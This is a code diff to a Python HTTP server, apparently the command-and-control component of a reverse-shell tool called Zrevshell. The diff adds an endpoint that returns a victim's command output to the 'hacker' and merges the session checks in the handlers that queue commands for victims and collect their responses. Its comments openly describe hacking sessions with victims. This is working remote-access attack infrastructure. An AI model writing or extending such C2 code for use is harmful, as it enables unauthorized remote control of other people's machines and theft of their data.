@@ -50,7 +50,7 @@ class ZrevshellServer(BaseHTTPRequestHandler):
                 HTTPMethod.GET,
             ],
             ut.ServerCommands.fetch_res: [
-                lambda: (False, HTTPStatus.NOT_IMPLEMENTED),
+                self.handle_cmd_fetch_res,
                 HTTPMethod.GET,
             ],
         }
@@ -191,6 +191,19 @@ class ZrevshellServer(BaseHTTPRequestHandler):
 
         return decoded_data
 
+    def validate_session(self, client_id: str, requested_session: str):
+        """Validate the requested session with the session_id the client is actually in.
+        Returns a boolean a success and failure."""
+
+        # Very simple we'll check one condition that's
+        # if the requested_session_id and the real_session_id match
+
+        real_session_id = self.hacking_sessions.get_session_id(client_id)
+
+        if real_session_id != requested_session:
+            return False
+        return True
+
     # ---------- Server command handler methods ---------- #
 
     def handle_cmd_register(
@@ -255,9 +268,10 @@ class ZrevshellServer(BaseHTTPRequestHandler):
         if session_id is None or session_id == "":
             return sh.HandlerResponse(False, HTTPStatus.BAD_REQUEST)
 
-        # let's check first if the session_id is up and running
-        if not self.hacking_sessions.check_session_active(session_id):
-            return sh.HandlerResponse(False, HTTPStatus.NOT_FOUND)
+        # Session validation
+        is_valid_session = self.validate_session(client_id, session_id)
+        if not is_valid_session:
+            return sh.HandlerResponse(False, HTTPStatus.NOT_ACCEPTABLE)
 
         # Ok now we're sure we have an active session let's now
         # send the victim the commands, but if the command is None
@@ -274,6 +288,32 @@ class ZrevshellServer(BaseHTTPRequestHandler):
 
         return sh.HandlerResponse(
             True, HTTPStatus.OK, command, {"content-length": str(len(command))}
+        )
+
+    def handle_cmd_fetch_res(
+        self, client_id: str, client_type: int, req_body: str | None
+    ):
+        """Handle and serve the fetch_res command"""
+        # First let's try to read the request body, if it's None or ''
+        # report a bad request
+        requested_session_id = req_body
+
+        if requested_session_id is None or requested_session_id == "":
+            return sh.HandlerResponse(False, HTTPStatus.BAD_REQUEST)
+
+        # Session validation
+        is_valid_session = self.validate_session(client_id, requested_session_id)
+        if not is_valid_session:
+            return sh.HandlerResponse(False, HTTPStatus.NOT_ACCEPTABLE)
+
+        # If all's good let's fetch the response and send it to the hacker
+        # with a beautiful OK response code.
+        response = js.dumps(
+            self.hacking_sessions.get_response(requested_session_id)
+        ).encode()
+
+        return sh.HandlerResponse(
+            True, HTTPStatus.OK, response, {"content-length": str(len(response))}
         )
 
     def handle_cmd_post_res(
@@ -297,20 +337,10 @@ class ZrevshellServer(BaseHTTPRequestHandler):
         if session_id is None or response is None:
             return sh.HandlerResponse(False, HTTPStatus.BAD_REQUEST)
 
-        # Check if the sent session_id is active
-        if not self.hacking_sessions.check_session_active(session_id):
-            return sh.HandlerResponse(False, HTTPStatus.NOT_FOUND)
-
-        # Now check if the session accessed is running and really the client's
-        real_session_id = self.hacking_sessions.get_session_id(client_id)
-
-        if real_session_id is None:  # That means the client was never in a session
-            return sh.HandlerResponse(False, HTTPStatus.BAD_REQUEST)
-
-        else:
-            # Check if the real_session and the requested session match
-            if real_session_id != session_id:
-                return sh.HandlerResponse(False, HTTPStatus.FORBIDDEN)
+        # Session validation
+        is_valid_session = self.validate_session(client_id, session_id)
+        if not is_valid_session:
+            return sh.HandlerResponse(False, HTTPStatus.NOT_ACCEPTABLE)
 
         # Ok else, let's send the success code and insert the response in the session
         self.hacking_sessions.insert_response(session_id, response)
@@ -342,24 +372,10 @@ class ZrevshellServer(BaseHTTPRequestHandler):
         if session_id is None or command is None:
             return bad_request
 
-        # Check if the session is not still active
-        if not self.hacking_sessions.check_session_active(session_id):
-            # The victim is not even in session or it is in one, but
-            # not with this hacker. So let's return an error
-            return sh.HandlerResponse(False, HTTPStatus.NOT_FOUND)
-
-        # check if the hacker is in a session and that he is trying to access
-        # a session he is in
-        real_session_id = self.hacking_sessions.get_session_id(client_id)
-
-        if real_session_id is None:
-            # Means if the hacker isn't even in a session
-            return sh.HandlerResponse(False, HTTPStatus.BAD_REQUEST)
-
-        elif real_session_id is not None:
-            # Now we need to check if the real_session_id provided is really the hackers
-            if real_session_id != session_id:
-                return sh.HandlerResponse(False, HTTPStatus.FORBIDDEN)
+        # Session validation
+        is_valid_session = self.validate_session(client_id, session_id)
+        if not is_valid_session:
+            return sh.HandlerResponse(False, HTTPStatus.NOT_ACCEPTABLE)
 
         # If we are in session with the victim and satisfy all the other requirements
         # we can proceed by inserting the command in the session comm.
